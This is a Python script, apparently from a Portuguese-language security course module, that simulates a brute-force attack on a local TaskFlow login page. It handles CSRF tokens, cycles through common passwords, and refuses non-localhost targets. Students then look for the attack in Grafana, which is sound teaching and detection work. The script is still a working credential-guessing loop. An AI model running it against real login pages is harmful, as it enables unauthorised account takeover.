"""Simulação de força bruta contra o /login da TaskFlow LOCAL (Módulo 6).

Uso SOMENTE contra o ambiente do próprio grupo (padrão: http://127.0.0.1:5000).
Recusa alvos que não sejam localhost, para não virar ferramenta de ataque.

    python scripts/forca_bruta.py                      # 40 tentativas contra "admin"
    python scripts/forca_bruta.py --tentativas 80 --usuario aluno
    python scripts/forca_bruta.py --acertar            # a última senha é a correta

Cada tentativa faz o que um atacante faria contra um formulário com CSRF: GET /login para
obter cookie e token, depois POST com uma senha da lista. Só usa a biblioteca padrão.
"""

import argparse
import http.cookiejar
import re
import sys
import time
import urllib.parse
import urllib.request

SENHAS = [
    "123456", "password", "admin", "12345678", "qwerty", "senha", "senha123",
    "abc123", "111111", "admin1", "letmein", "welcome", "iloveyou", "monkey",
    "dragon", "football", "master", "sunshine", "princess", "trustno1",
]  # fmt: skip

ALVOS_PERMITIDOS = {"127.0.0.1", "localhost", "::1"}


class SemRedirecionar(urllib.request.HTTPRedirectHandler):
    """Não segue o 302: o 302 do /login É o sinal de senha correta."""

    def redirect_request(self, *args, **kwargs):
        return None


def tentativa(base: str, usuario: str, senha: str) -> int:
    jar = http.cookiejar.CookieJar()
    # Passar a subclasse no build_opener SUBSTITUI o redirecionador padrão.
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), SemRedirecionar)
    html = opener.open(f"{base}/login", timeout=10).read().decode()  # noqa: S310 - alvo validado
    token = re.search(r'name="csrf_token" value="([^"]+)"', html).group(1)
    dados = urllib.parse.urlencode(
        {"username": usuario, "password": senha, "csrf_token": token}
    ).encode()
    try:
        return opener.open(f"{base}/login", data=dados, timeout=10).status  # noqa: S310
    except urllib.error.HTTPError as erro:
        return erro.code


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    p.add_argument("--alvo", default="http://127.0.0.1:5000")
    p.add_argument("--usuario", default="admin")
    p.add_argument("--tentativas", type=int, default=40)
    p.add_argument("--intervalo", type=float, default=0.1, help="segundos entre tentativas")
    p.add_argument("--acertar", action="store_true", help="última tentativa usa a senha de lab")
    args = p.parse_args()

    host = urllib.parse.urlparse(args.alvo).hostname
    if host not in ALVOS_PERMITIDOS:
        print(f"Recusado: {host} não é localhost. Este script só ataca o ambiente local.")
        return 2

    falhas = 0
    for i in range(args.tentativas):
        senha = SENHAS[i % len(SENHAS)] + ("" if i < len(SENHAS) else str(i))
        if args.acertar and i == args.tentativas - 1:
            senha = {"admin": "admin123", "aluno": "senha123"}.get(args.usuario, senha)
        status = tentativa(args.alvo, args.usuario, senha)
        sucesso = status == 302
        falhas += not sucesso
        print(f"[{i + 1:03d}] {args.usuario}:{'*' * len(senha)} -> HTTP {status}"
              f"{'  <-- LOGIN OBTIDO' if sucesso else ''}")  # fmt: skip
        time.sleep(args.intervalo)

    print(f"\n{args.tentativas} tentativas, {falhas} falhas. Agora procure no Grafana (painel Q1).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
